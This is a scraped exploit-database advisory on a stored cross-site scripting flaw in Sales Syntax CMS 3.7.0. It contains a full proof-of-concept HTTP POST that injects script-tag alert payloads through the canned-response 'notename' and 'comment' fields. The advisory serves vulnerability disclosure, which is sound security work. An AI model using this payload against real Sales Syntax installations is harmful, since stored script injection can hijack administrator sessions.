---
title: Sales Syntax CMS - Stored Cross-Site Scripting
url: https://cxsecurity.com/issue/WLB-2025090004
source: CXSECURITY Database RSS Feed - CXSecurity.com
date: 2025-09-11
fetch_date: 2025-10-02T19:57:17.291384
---

# Sales Syntax CMS - Stored Cross-Site Scripting

[![Home Page](https://cert.cx/cxstatic/images/12018/cxseci.png)](https://cxsecurity.com/)

* [Home](https://cxsecurity.com/)
* Bugtraq
  + [Full List](https://cxsecurity.com/wlb/)
  + [Only Bugs](https://cxsecurity.com/bugs/)
  + [Only Tricks](https://cxsecurity.com/tricks/)
  + [Only Exploits](https://cxsecurity.com/exploit/)
  + [Only Dorks](https://cxsecurity.com/dorks/)
  + [Only CVE](https://cxsecurity.com/cvelist/)
  + [Only CWE](https://cxsecurity.com/cwelist/)
  + [Fake Notes](https://cxsecurity.com/bogus/)
  + [Ranking](https://cxsecurity.com/best/1/)
* CVEMAP
  + [Full List](https://cxsecurity.com/cvemap/)
  + [Show Vendors](https://cxsecurity.com/cvevendors/)
  + [Show Products](https://cxsecurity.com/cveproducts/)
  + [CWE Dictionary](https://cxsecurity.com/allcwe/)
  + [Check CVE Id](https://cxsecurity.com/cve/)
  + [Check CWE Id](https://cxsecurity.com/cwe/)
* Search
  + [Bugtraq](https://cxsecurity.com/search/)
  + [CVEMAP](https://cxsecurity.com/search/cve/)
  + [By author](https://cxsecurity.com/search/author/)
  + [CVE Id](https://cxsecurity.com/cve/)
  + [CWE Id](https://cxsecurity.com/cwe/)
  + [By vendors](https://cxsecurity.com/cvevendors/)
  + [By products](https://cxsecurity.com/cveproducts/)
* RSS
  + [Bugtraq](https://cxsecurity.com/wlb/rss/all/)
  + [CVEMAP](https://cxsecurity.com/cverss/fullmap/)
  + [CVE Products](https://cxsecurity.com/cveproducts/)
  + [Bugs](https://cxsecurity.com/wlb/rss/vulnerabilities/)
  + [Exploits](https://cxsecurity.com/wlb/rss/exploit/)
  + [Dorks](https://cxsecurity.com/wlb/rss/dorks/)
* More
  + [cIFrex](http://cifrex.org/)
  + [Facebook](https://www.facebook.com/cxsec)
  + [Twitter](https://twitter.com/cxsecurity)
  + [Donate](https://cxsecurity.com/donate/)
  + [About](https://cxsecurity.com/wlb/about/)

* [Submit](https://cxsecurity.com/wlb/add/)

|  |  |  |  |
| --- | --- | --- | --- |
|  |  | |  | | --- | | **Sales Syntax CMS - Stored Cross-Site Scripting** **2025.09.10**  Credit:  **[Erdinç ODABAŞ](https://cxsecurity.com/author/Erdin%C3%A7%2BODABA%C5%9E/1/)**  Risk: **Low**  Local: **No**  Remote: ****Yes****  CVE: **N/A**  CWE: **[CWE-79](https://cxsecurity.com/cwe/CWE-79 "Click to see CWE-79")** | |

# Exploit Title: Sales Syntax CMS - Stored Cross-Site Scripting
# Google Dork: N/A
# Date: 2025-09-06 [YYYY/MM/DD]
# Exploit Author: Erdinç ODABAŞ
# Vendor Homepage: www.salessyntax.net
# Vulnerable Software --> [ https://www.salessyntax.net/salessyntax-3.7.0.zip ]
# Affected Version: [ v3.7.0 ]
# CVE-ID: N/A
# Tested on: Windows 10
# Vulnerable Parameter Type: POST
# Vulnerable Parameter: comment
# Attack Pattern: <script>alert("Erdinc")</script>
# Description
Allows it to run a Cross-Site Scripting by saving a new title from the "Edit Canned Responses" tab.
# Proof of Concepts:
POST /Sales\_Syntaxrr6lw68y2d/edit\_quick.php HTTP/1.1
Host: 127.0.0.1
Cookie: AEFCookies1526[aefsid]=55imd0pwmt8zvnahftzwuxanrnq0kcav; demo\_523=%7B%22sid%22%3A523%2C%22adname%22%3A%22admin%22%2C%22adpass%22%3A%22pass%22%2C%22url%22%3A%22https%3A%5C%2F%5C%2Fdemos5.softaculous.com%5C%2FCotontimx82untgbn%22%2C%22adminurl%22%3A%22https%3A%5C%2F%5C%2F127.0.0.1%5C%2FCotontimx82untgbn%5C%2Fadmin.php%22%2C%22dir\_suffix%22%3A%22mx82untgbn%22%7D; cslhOPERATOR=fe8e5a645d3ba40dd9c8b0439314d338
Content-Length: 216
Cache-Control: max-age=0
Sec-Ch-Ua: "Chromium";v="139", "Not;A=Brand";v="99"
Sec-Ch-Ua-Mobile: ?0
Sec-Ch-Ua-Platform: "Windows"
Accept-Language: tr-TR,tr;q=0.9
Origin: https://127.0.0.1
Content-Type: application/x-www-form-urlencoded
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/139.0.0.0 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,\*/\*;q=0.8,application/signed-exchange;v=b3;q=0.7
Sec-Fetch-Site: same-origin
Sec-Fetch-Mode: navigate
Sec-Fetch-User: ?1
Sec-Fetch-Dest: frame
Referer: https://127.0.0.1/Sales\_Syntaxrr6lw68y2d/edit\_quick.php?action=edit&typeof=
Accept-Encoding: gzip, deflate, br
Priority: u=0, i
Connection: keep-alive
typing=no&user\_id=1&alt\_what=&typeof=&timeof=20250906222448&editid=0&notename=%3Cscript%3Ealert%28%27Erdinc%27%29%3C%2Fscript%3E&visiblity=Private&comment=%3Cscript%3Ealert%28%27Erdinc2%27%29%3C%2Fscript%3E&what=SAVE

**##### References:**

# Vendor Homepage: www.salessyntax.net
# Vulnerable Software --> [

https://www.salessyntax.net/salessyntax-3.7.0.zip

]

[**See this note in RAW Version**](https://cxsecurity.com/ascii/WLB-2025090004)

[Tweet](https://twitter.com/share)

Vote for this issue:
 0
 0

50%

50%

#### **Thanks for you vote!**

#### **Thanks for you comment!** Your message is in quarantine 48 hours.

Comment it here.

Nick (\*)

Email (\*)

Video

Text (\*)

(\*) - required fields.
Cancel
Submit

|  |  |
| --- | --- |
|  | **{{ x.nick }}** ![]() | Date: {{ x.ux \* 1000 | date:'yyyy-MM-dd' }} *{{ x.ux \* 1000 | date:'HH:mm' }}* CET+1  ---   {{ x.comment }} |

Show all comments

---

Copyright **2025**, cxsecurity.com

|  |

Back to Top